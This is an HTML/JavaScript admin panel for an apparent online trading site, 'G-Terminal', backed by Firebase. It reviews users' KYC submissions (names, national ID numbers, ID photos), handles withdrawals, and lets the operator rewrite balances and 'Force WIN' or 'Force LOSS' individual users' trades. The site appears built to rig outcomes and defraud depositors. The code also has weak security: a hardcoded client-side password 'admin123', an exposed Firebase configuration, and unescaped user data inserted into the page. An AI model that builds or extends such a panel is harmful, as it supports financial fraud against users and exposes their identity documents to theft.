<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Master Admin | G-Terminal</title>
    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-auth-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-database-compat.js"></script>
    <style>
        :root { --bg: #0b0e11; --card: #1e2329; --yellow: #f0b90b; --green: #02c076; --red: #f6465d; --text: #ffffff; }
        body { background: var(--bg); color: var(--text); font-family: sans-serif; padding: 20px; display: none; } /* Hidden by default for login */
        .section { background: var(--card); padding: 20px; border-radius: 12px; margin-bottom: 20px; border: 1px solid #2b3139; }
        h2 { color: var(--yellow); border-bottom: 1px solid #333; padding-bottom: 10px; }
        .search-box { width: 100%; padding: 10px; margin-bottom: 15px; border-radius: 5px; border: 1px solid #444; background: #000; color: #fff; }
        table { width: 100%; border-collapse: collapse; margin-top: 10px; }
        th, td { padding: 12px; text-align: left; border-bottom: 1px solid #2b3139; font-size: 0.9rem; }
        th { color: #848e9c; }
        .btn { padding: 8px 12px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; margin-right: 5px; }
        .btn-ok { background: var(--green); color: white; }
        .btn-no { background: var(--red); color: white; }
        .btn-win { background: var(--green); color: black; width: 100%; margin-top: 5px; }
        .btn-loss { background: var(--red); color: white; width: 100%; margin-top: 5px; }
        img { width: 50px; border-radius: 5px; cursor: pointer; }
    </style>
</head>
<body>

    <h1>G-Terminal Admin Panel</h1>

    <div class="section">
        <h2>🔍 Quick Search</h2>
        <input type="text" id="userSearch" class="search-box" placeholder="Search user by email..." onkeyup="filterUsers()">
    </div>

    <div class="section">
        <h2>🆔 KYC Requests</h2>
        <table id="kyc-table">
            <thead>
                <tr><th>User</th><th>Details</th><th>CNIC</th><th>Action</th></tr>
            </thead>
            <tbody id="kyc-list"></tbody>
        </table>
    </div>

    <div class="section">
        <h2>💰 Withdrawal Requests</h2>
        <table id="withdraw-table">
            <thead>
                <tr><th>User</th><th>Amount</th><th>Method/Acc</th><th>Action</th></tr>
            </thead>
            <tbody id="withdraw-list"></tbody>
        </table>
    </div>

    <div class="section">
        <h2>👥 Users & Trade Manipulation</h2>
        <table id="user-table">
            <thead>
                <tr><th>User Email</th><th>Balance</th><th>Force Result</th></tr>
            </thead>
            <tbody id="user-list"></tbody>
        </table>
    </div>

    <script>
        // --- Simple Login Protection ---
        const pass = prompt("Enter Admin Password:");
        if (pass === "admin123") { // Aap apna password yahan set karein
            document.body.style.display = "block";
        } else {
            alert("Wrong Password!");
            window.location.reload();
        }

        // Firebase Config
        const firebaseConfig = { 
            apiKey: "AIzaSyCM_qmcvOXXjJrQHPiracy5SOpTjAJEnYU", 
            authDomain: "trade-for-profit-8b160.firebaseapp.com", 
            databaseURL: "https://trade-for-profit-8b160-default-rtdb.firebaseio.com", 
            projectId: "trade-for-profit-8b160", 
            storageBucket: "trade-for-profit-8b160.firebasestorage.app", 
            messagingSenderId: "1077014018991", 
            appId: "1:1077014018991:web:c41320e2ef10291afd4d5a" 
        };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        // --- Search Function ---
        function filterUsers() {
            let input = document.getElementById('userSearch').value.toLowerCase();
            let rows = document.querySelectorAll('#user-table tbody tr');
            rows.forEach(row => {
                row.style.display = row.cells[0].innerText.toLowerCase().includes(input) ? '' : 'none';
            });
        }

        // --- Load Data ---
        db.ref('users').on('value', snap => {
            let kycHTML = "";
            let userHTML = "";
            snap.forEach(child => {
                const u = child.val();
                const uid = child.key;

                if(u.kyc_status === "PENDING") {
                    kycHTML += `<tr>
                        <td>${u.email}</td>
                        <td>Name: ${u.kyc_data.name}<br>CNIC: ${u.kyc_data.cnic}</td>
                        <td><img src="${u.kyc_data.image}" onclick="window.open(this.src)"></td>
                        <td>
                            <button class="btn btn-ok" onclick="updateKYC('${uid}', 'APPROVED')">Approve</button>
                            <button class="btn btn-no" onclick="updateKYC('${uid}', 'REJECTED')">Reject</button>
                        </td>
                    </tr>`;
                }

                userHTML += `<tr>
                    <td>${u.email}</td>
                    <td><input type="number" value="${u.balance}" onchange="updateBal('${uid}', this.value)" style="width:80px; background:#000; color:var(--yellow); border:1px solid #444;"></td>
                    <td>
                        <button class="btn btn-win" onclick="setControl('${uid}', 'WIN')">Force WIN</button>
                        <button class="btn btn-loss" onclick="setControl('${uid}', 'LOSS')">Force LOSS</button>
                        <button class="btn" onclick="setControl('${uid}', 'NORMAL')" style="width:100%; margin-top:5px;">Normal</button>
                    </td>
                </tr>`;
            });
            document.getElementById('kyc-list').innerHTML = kycHTML;
            document.getElementById('user-list').innerHTML = userHTML;
        });

        // --- Withdrawal Logic ---
        db.ref('withdrawals').on('value', snap => {
            let winHTML = "";
            snap.forEach(child => {
                const w = child.val();
                const wid = child.key;
                if(w.status === "PENDING") {
                    winHTML += `<tr>
                        <td>${w.email}</td>
                        <td>$${w.amount}</td>
                        <td>${w.method}<br>${w.account}</td>
                        <td>
                            <button class="btn btn-ok" onclick="approveWithdraw('${w.uid}', '${wid}', ${w.amount})">Paid</button>
                            <button class="btn btn-no" onclick="rejectWithdraw('${wid}')">Reject</button>
                        </td>
                    </tr>`;
                }
            });
            document.getElementById('withdraw-list').innerHTML = winHTML;
        });

        // --- Firebase Update Functions ---
        function updateKYC(uid, status) {
            db.ref('users/' + uid).update({ kyc_status: status });
            alert("KYC " + status);
        }

        function updateBal(uid, newBal) {
            db.ref('users/' + uid).update({ balance: parseFloat(newBal) });
        }

        function setControl(uid, mode) {
            db.ref('users/' + uid).update({ control: mode });
            alert("User set to: " + mode);
        }

        function approveWithdraw(uid, wid, amt) {
            db.ref('users/' + uid).once('value', s => {
                let currentBal = s.val().balance;
                if(currentBal >= amt) {
                    db.ref('users/' + uid).update({ balance: currentBal - amt });
                    db.ref('withdrawals/' + wid).update({ status: "SUCCESS" });
                    alert("Success!");
                } else { alert("Insufficient User Balance!"); }
            });
        }

        function rejectWithdraw(wid) {
            db.ref('withdrawals/' + wid).update({ status: "REJECTED" });
            alert("Rejected!");
        }
    </script>
</body>
</html>
